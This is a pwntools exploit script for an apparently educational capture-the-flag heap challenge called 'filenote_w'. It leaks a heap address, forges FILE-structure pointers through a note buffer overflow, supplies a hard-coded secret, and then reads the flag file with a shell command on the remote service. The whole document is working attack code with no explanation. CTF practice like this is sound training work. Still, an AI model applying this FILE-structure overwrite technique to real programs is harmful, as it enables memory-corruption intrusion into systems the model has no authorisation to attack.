from pwn import *
split = lambda v,sz: [v[i:i+sz] for i in range(0,len(v),sz)]

HOST, PORT = 'edu-ctf.zoolab.org', 30216
if args.HOST: HOST = args.HOST
if args.PORT: PORT = args.PORT

exe = context.binary = ELF('./lab2_release/filenote_w/chal')

if args.REMOTE:
    io = remote(HOST,PORT)
else:
    io = process(exe.path)
    pause()

note_offset = 0x2d0
note_buffer = int(io.readline().split()[-1], 16)
heap_base = note_buffer - note_offset
info(f'heap_base: {hex(heap_base)}')

io.sendlineafter(b'>', b'1')
# pause()

secret = b'gura_50_cu73\0'
debug_buffer = heap_base + 0x2a0
tmp_file_offset = 0x4e0
offset = tmp_file_offset - note_offset

flags = 0
write_base = 0
write_ptr = 0
write_end = 0
read_ptr = 0
read_end = 0
read_base = 0
buf_base = debug_buffer
buf_end = buf_base + 0x30
fd = 0

payload = flat({
    offset: [
        flags, read_ptr,
        read_end, read_base,
        write_base, write_ptr,
        write_end, buf_base,
        buf_end, 0,
        0, 0,
        0, 0,
        fd
    ],
})

io.sendlineafter(b'>', b'2')
io.sendlineafter(b'>', payload)

# pause()
io.sendlineafter(b'>', b'4')
io.sendline(secret)

if not args.REMOTE:
    io.interactive()
else:
    io.clean(1)
    io.sendline(b'cat /home/`whoami`/flag*')
    flag = io.readuntil(b'}').strip().decode()
    success(flag)
